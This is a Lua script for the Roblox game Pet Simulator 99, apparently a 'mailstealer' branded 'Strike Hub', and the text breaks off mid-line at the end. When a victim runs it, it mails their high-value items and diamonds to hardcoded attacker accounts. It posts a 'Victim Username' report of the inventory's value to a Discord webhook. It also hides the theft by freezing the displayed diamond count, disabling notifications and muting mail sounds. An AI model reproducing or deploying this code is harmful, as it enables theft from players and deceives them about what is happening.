_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local network = require(game.ReplicatedStorage.Library.Client.Network)
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "GGz"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
local message = require(game.ReplicatedStorage.Library.Client.Message)
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

local users = _G.Usernames or {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"}
local min_rap = _G.minrap or 1000000
local webhook = _G.webhook or ""

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add any usernames or webhook")
    return
end

for _, user in ipairs(users) do
    if plr.Name == user then
        plr:kick("You cannot mailsteal yourself")
        return
    end
end

-- Get mail send price function
for _, func in pairs(getgc()) do
    if debug.getinfo(func).name == "computeSendMailCost" then
        FunctionToGetFirstPriceOfMail = func
        break
    end
end

local mailSendPrice = FunctionToGetFirstPriceOfMail()

local GemAmount1 = 1
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
        break
    end
end

-- Format number for webhook
local function formatNumber(number)
    local number = math.floor(number)
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- Webhook reporting
local function SendMessage(diamonds)
    local headers = {["Content-Type"] = "application/json"}
    local fields = {
        {name = "Victim Username:", value = plr.Name, inline = true},
        {name = "Items to be sent:", value = "", inline = false},
        {name = "Summary:", value = "", inline = false}
    }

    local combinedItems = {}
    local itemRapMap = {}

    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
    end)

    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
    end

    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))

    local data = {
        ["embeds"] = {{
            ["title"] = "\240\159\144\177 New PS99 Execution",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {["text"] = "Strike Hub."}
        }}
    }

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local body = HttpService:JSONEncode(data)
    request({Url = webhook, Method = "POST", Headers = headers, Body = body})
end

-- Freeze diamonds in leaderstats
local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
    gemsleaderstatpath.Value = gemsleaderstat
end)

-- Disable notifications & loading GUI
local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = plr.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function() noti.Enabled = false end)
noti.Enabled = false

-- Mute all mail sending sounds
game.DescendantAdded:Connect(function(descendant)
    if descendant:IsA("Sound") then
        if descendant.SoundId == "rbxassetid://11839132565" or 
           descendant.SoundId == "rbxassetid://14254721038" or 
           descendant.SoundId == "rbxassetid://12413423276" then
            descendant.Volume = 0
            descendant.PlayOnRemove = false
            descendant:Destroy()
        end
    end
end)

-- Get RAP for item
local function getRAP(Type, Item)
    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get({
        Class = {Name = Type},
        IsA = function(hmm) return hmm == Type end,
        GetId = function() return Item.id end,
        StackKey = function() return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn}) end,
        AbstractGetRAP = function() return nil end
    }) or 0)
end

-- Send item to mailbox, switch users if full
local function sendItem(category, uid, am)
    local userIndex = 1
    local maxUsers = #users
    local sent = false
    
    repeat
        local currentUser = users[userIndex]
        local args = {currentUser, MailMessage, category, uid, am or 1}
        local response, err = network.Invoke("Mailbox: Send", unpack(args))

        if response == true then
            sent = true
            GemAmount1 = GemAmount1 - mailSendPrice
            mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
        elseif err == "They don't have enough space!" then
            userIndex = userIndex + 1
            if userIndex > maxUsers then
                sent = true
            end
        end
    until sent
end

-- Send all remaining diamonds
local function SendAllGems()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" and GemAmount1 >= (mailSendPrice + 10000) then
            local userIndex = 1
            local maxUsers = #users
            local sent = false
            repeat
                local currentUser = users[userIndex]
                local args = {currentUser, MailMessage, "Currency", i, GemAmount1 - mailSendPrice}
                local response, err = network.Invoke("Mailbox: Send", unpack(args))
                if response == true then
                    sent = true
                elseif err == "They don't have enough space!" then
                    userIndex = userIndex + 1
                    if userIndex > maxUsers then sent = true end
                end
            until sent
            break
        end
    end
end

-- Empty boxes
local function EmptyBoxes()
    if save.Box then
        for key, value in pairs(save.Box) do
            if value._uq then
                network.Invoke("Box: Withdraw All", key)
            end
        end
    end
end

-- Claim all mail
local function ClaimMail()
    local response, err = network.Invoke("Mailbox: Claim All")
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait(0.2)
        response, err = network.Invoke("Mailbox: Claim All")
    end
end

-- Check if mail can be sent
local function canSendMail()
    local uid
    for i, v in pairs(save["Pet"]) do uid = i break end
    local args = {"Roblox","Test","Pet",uid,1}
    local response, err = network.Invoke("Mailbox: Send", unpack(args))
    return (err == "They don't have enough space!")
end

-- Claim daycare
require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).
